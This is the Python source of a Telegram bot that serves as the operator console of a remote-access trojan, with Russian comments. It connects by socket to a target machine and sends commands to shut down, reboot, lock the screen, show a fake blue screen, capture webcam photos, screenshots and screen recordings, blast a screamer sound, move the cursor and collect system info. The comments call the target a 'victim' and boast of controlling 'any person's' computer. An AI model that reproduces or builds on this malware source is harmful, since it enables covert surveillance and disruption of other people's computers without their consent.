from keyboard.list_keyboards_info import connected_keyboard, keyboard_control_pc, keyboard_check_is_control, keyboard_control_youtube, screen_recording_keyboard, random_cursor_keyboard
from keyboard.kbBuilder import make_row_inline_keyboards
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram import F, Router
from States.State import Reg
import socket

router = Router()
global_data_store = {}
client = None


async def check_input_type(text):
    # Проверяем, состоит ли текст из 4 цифр
    return text.isdigit() and len(text) == 4


@router.message(F.text == '🔛 Подключиться к 🖥️')
async def connected_ip(message: Message, state: FSMContext):
    await state.clear()
    await message.answer('Введите IP который вам отправился: ')
    await state.set_state(Reg.connected_ip)


@router.message(Reg.connected_ip)
async def connected_ip_fsm(message: Message, state: FSMContext):
    await state.update_data(ip=message.text)
    await message.answer('Отлично! Введите порт: ')
    await state.set_state(Reg.connected_port)


@router.message(Reg.connected_port)
async def connected_port(message: Message, state: FSMContext):
    get_port = message.text

    if await check_input_type(get_port):
        await state.update_data(port=get_port)
        get_data = await state.get_data()

        # Сохраняем данные в глобальном словаре
        global_data_store[message.from_user.id] = {
            "ip": f"{get_data['ip']}",
            "port": int(get_data['port']),  # Преобразуем порт в целое число
        }

        data_info = global_data_store[message.from_user.id]
        await message.answer(f'IP: {data_info.get("ip")}\nPORT: {data_info.get("port")}', reply_markup=make_row_inline_keyboards(connected_keyboard))
        await state.clear()

    else:
        await message.answer('Введите полученный 4-х значный порт. (0000):')
        await state.set_state(Reg.connected_port)


# Пример использования глобальных данных в другом обработчике
@router.callback_query(F.data == 'connect_data')
async def connect_data_func(callback: CallbackQuery):
    global client
    user_id = callback.from_user.id

    # Если пользователь с user_id присутствует в словаре
    if user_id in global_data_store:
        data_info = global_data_store[user_id]
        await callback.message.edit_text(f"Подключение к {data_info.get('ip')} на порту {data_info.get('port')}...")

        # Если данные успешны, то подключаемся
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((data_info.get('ip'), data_info.get('port')))
            await callback.message.edit_text('Вы успешно подключились!', reply_markup=make_row_inline_keyboards(keyboard_check_is_control))
        # При возникновении непредвиденных ошибок
        except Exception as e:
            await callback.message.answer(f'Ошибка подключения: {e}')
    # Если данные не успешны, вызываем ошибку
    else:
        await callback.message.answer('Данные подключения недоступны. Пожалуйста, попробуйте снова.')


# Закрыть соединение с компьютером
@router.message(F.text == "📴 Закрыть соединение с 🖥️")
async def disconnect_handler(message: Message, state: FSMContext):
    await state.clear()
    global client
    if client:
        client.close()
        await message.answer('Вы отключены от сервера.')
    else:
        await message.answer('Вы не подключены к серверу.')


################################################################## Все функции для управления компьютера

# Функция для вывода клавиатуры с управлением пк
@router.callback_query(F.data == 'control_pc')
async def control_pc_func(callback: CallbackQuery):
    await callback.answer('')
    await callback.message.edit_text('Успешно! Доступный функционал компьютера: ', reply_markup=make_row_inline_keyboards(keyboard_control_pc))


# Выключение пк
@router.callback_query(F.data == 'shutdown_data')
async def shutdown_data(callback: CallbackQuery):
    """
    Данная функция отправляет сообщение на компьютер к которому мы подключились с помощью сокетов.
     Функция называется shutdown (Выключить компьютер).
      На стороне клиента эта функция уже обрабатывает функцию выключение компьютера.
      Тем самым мы можем удаленно выключить компьютер любого человека.
    """

    await callback.answer('')
    global client

    if client:
        try:
            client.send("shutdown_data".encode())
            await callback.message.answer('Компьютер успешно выключен.')
        except Exception as e:
            await callback.message.answer(f"Ошибка при отправке сообщения: {e}")
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Перезагрузка пк
@router.callback_query(F.data == 'reload_data')
async def restart_data(callback: CallbackQuery):
    """
    Данная функция отправляет сообщение на компьютер к которому мы подключились с помощью сокетов.
     Функция называется restart (Перезагрузить компьютер).
      На стороне клиента эта функция уже обрабатывает функцию перезагрузки компьютера.
      Тем самым мы можем удаленно перезагрузить компьютер любого человека.
    """

    await callback.answer('')
    global client

    if client:
        try:
            await callback.message.answer('Компьютер успешно перезагружен.')
            client.send('reload_data'.encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Функция для блокировки экрана пользователя. (Выключения)
@router.callback_query(F.data == 'lock_screen_data')
async def look_screen_func(callback: CallbackQuery):
    """
    Данная функция отправляет сообщение на компьютер к которому мы подключились с помощью сокетов.
     Функция называется look_screen (Блокировка экрана (Выключение экрана)).
      На стороне клиента эта функция уже обрабатывает функцию для выключения экрана до первого взаимодействия пользователя с компьютером. После чего экран снова включиться.
      Тем самым мы можем удаленно выключать экран любого компьютера.
    """

    await callback.answer('')
    global client

    if client:
        try:
            await callback.message.answer('Экран компьютера заблокирован успешно!!')
            client.send('lock_screen_data'.encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Функция для бесконечного открывания картинок BSOD в браузере по умолчанию
@router.callback_query(F.data == 'bsod_screen_brows_data')
async def blue_screen_in_brows(callback: CallbackQuery):
    """
    Данная функция отправляет сообщение на компьютер к которому мы подключились с помощью сокетов.
     Функция называется bsod_browser (Синий экран смерти в браузере (blue_screen_of_dead)).
      На стороне клиента эта функция уже обрабатывает функцию бесконечного открытия фоток синего экрана смерти компьютера.
      Тем самым мы можем удаленно вызвать шуточный спам синего экран смерти компьютера, любого человека.
    """

    await callback.answer('')
    global client

    if client:
        try:
            await callback.message.answer('Синий экран вызван успешно!')
            client.send('bsod_screen_brows_data'.encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Функция для открытия фотографии BSOD на весь экран и без управления (Выключения, управления и др.)
@router.callback_query(F.data == 'blue_screen_of_dead')
async def blue_screen(callback: CallbackQuery):
    """
    Данная функция отправляет сообщение на компьютер к которому мы подключились с помощью сокетов.
     Функция называется bsod_browser (Синий экран смерти (blue_screen_of_dead)).
      На стороне клиента эта функция уже обрабатывает функцию вызова шуточного синего экрана смерти компьютера.
      Тем самым мы можем удаленно вызвать шуточный синий экран смерти компьютера, любого человека.
    """

    await callback.answer('')
    global client

    if client:
        try:
            await callback.message.answer('Синий экран вызван успешно!')
            client.send('blue_screen_of_dead'.encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Функция скриншота камеры пользователя и отправки фотографии в телеграмм
@router.callback_query(F.data == 'screenshot_user_data')
async def image_user_func(callback: CallbackQuery):
    """
    Данная функция делает фотографию пользователя если у пользователя есть камера
    В случае если есть, программа делает фотку и отправляет вам фотку в личные сообщения.
    """

    await callback.answer('')
    global client

    if client:
        try:
            client.send('screenshot_user_data'.encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Данная функция делает скриншот рабочего стола пользователя
@router.callback_query(F.data == 'screenshot_screen_data')
async def screenshot_main_window_func(callback: CallbackQuery):
    """
    Данная функция делает скриншот рабочего стола пользователя и отправляет вам в личные сообщения
    """

    await callback.answer('')
    global client

    if client:
        try:
            client.send("screenshot_screen_data".encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Создает клавиатуры в которой выбираете то что будете делать с экраном жертвы
@router.callback_query(F.data == 'recording_screen_data')
async def record_screen_data(callback: CallbackQuery):
    """
    Создает клавиатуры в которой выбираете то что будете делать с экраном жертвы
    """
    # К имеющейся клавиатуре добавляет новую кнопку "Назад"
    add_back_data_keyboard = [("Назад", "back_data")] + screen_recording_keyboard
    await callback.answer("")
    await callback.message.answer("Выберите опцию: ", reply_markup=make_row_inline_keyboards(add_back_data_keyboard))


@router.callback_query(F.data == 'start_record_data')
async def start_record_func(callback: CallbackQuery):
    global client
    if client:
        try:
            client.send('start_record_data'.encode())
            await callback.message.answer('Чтобы остановить запись достаточно нажать на кнопку "Остановить запись"', reply_markup=make_row_inline_keyboards(screen_recording_keyboard))
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


@router.callback_query(F.data == 'stop_record_data')
async def stop_record_func(callback: CallbackQuery):
    await callback.answer()
    global client

    if client:
        try:
            client.send('stop_record_data'.encode())
            await callback.message.answer("Запись успешно сохранена! Ожидайте, запись экрана грузится.")
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Скрывает все окна
@router.callback_query(F.data == 'hide_all_windows_data')
async def hide_all_windows_data_func(callback: CallbackQuery):
    """
    """

    await callback.answer()

    global client
    if client:
        try:
            client.send("hide_all_windows_data".encode())
            await callback.message.answer('Все окна успешно свернуты!')
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Устанавливает максимальный звук на компьютере
@router.callback_query(F.data == 'max_volume_data')
async def max_volume_data_func(callback: CallbackQuery):
    """
    """

    await callback.answer()
    global client

    if client:
        try:
            client.send('max_volume_data'.encode())
            await callback.message.answer("Максимальная громкость компьютера включена.")
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Устанавливает максимальный звук на компьютере и включает резкий звук
@router.callback_query(F.data == 'screamer_song_data')
async def screamer_song_data_func(callback: CallbackQuery):
    """
    """
    await callback.answer()
    global client

    if client:
        try:
            client.send('screamer_song_data'.encode())
            await callback.message.answer("Максимальная громкость компьютера включена.")
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


# Создаем клавиатуру с Вкл/Выкл'ем случайного перемещения курсора
@router.callback_query(F.data == 'control_mouse_data')
async def control_mouse_data(callback: CallbackQuery):
    """"""
    # К имеющейся клавиатуре добавляю кнопку "Назад"
    keyboard = [("Назад", "back_data")] + random_cursor_keyboard
    await callback.message.answer('Какое действие вы хотите совершить с мышкой?', reply_markup=make_row_inline_keyboards(keyboard))


@router.callback_query(F.data == 'random_cursor_start_data')
async def random_cursor_start_data_func(callback: CallbackQuery):
    global client

    if client:
        try:
            client.send('random_cursor_start_data'.encode())
            await callback.message.answer('Случайное перемещение курсора - Начато! Чтобы остановить перемещение, нажмите "Остановить перемещение"', reply_markup=make_row_inline_keyboards(random_cursor_keyboard))
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


@router.callback_query(F.data == 'random_cursor_stop_data')
async def random_cursor_stop_data_func(callback: CallbackQuery):
    global client

    if client:
        try:
            client.send('random_cursor_stop_data'.encode())
            await callback.message.answer('Вы успешно выключили перемещение курсора!')

        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


@router.callback_query(F.data == 'system_info_data')
async def system_info_data_func(callback: CallbackQuery):
    global client

    if client:
        try:
            client.send('system_info_data'.encode())
            await callback.message.answer('Данные компьютера успешно переданы!')

        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


@router.callback_query(F.data == 'turn_on_and_off_volume')
async def turn_on_and_off_volume_func(callback: CallbackQuery):
    """"""
    await callback.answer('')
    global client

    if client:
        try:
            client.send('turn_on_and_off_volume'.encode())
            await callback.message.answer('Действие успешно обработано, звук Включен/Выключен.')

        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')


@router.callback_query(F.data == 'send_command_data')
async def send_command_data_func(callback: CallbackQuery):
    """"""

    await callback.answer('Функция не работает!')
    await callback.message.answer('Функция не работает!')

################################################################## Все функции для управления Youtube


# Клавиатура с функционалом для управления Youtube
@router.callback_query(F.data == 'control_youtube')
async def control_youtube_keyboard(callback: CallbackQuery):
    """
    """

    await callback.answer('')
    await callback.message.edit_text('Доступный функционал использования программы Youtube: ', reply_markup=make_row_inline_keyboards(keyboard_control_youtube))


# Функция для открытия Youtube
@router.callback_query(F.data == 'open_youtube_data')
async def open_youtube_func(callback: CallbackQuery):
    """
    """

    await callback.answer('')
    if client:
        try:
            await callback.message.answer('Youtube успешно открыт.')
            client.send('youtube'.encode())
        except Exception as e:
            await callback.message.answer(f'Ошибка при отправке сообщения: {e}')
    else:
        await callback.message.answer('Сначала подключитесь к серверу с помощью команды кнопки "🔛 Подключиться к 🖥️".')
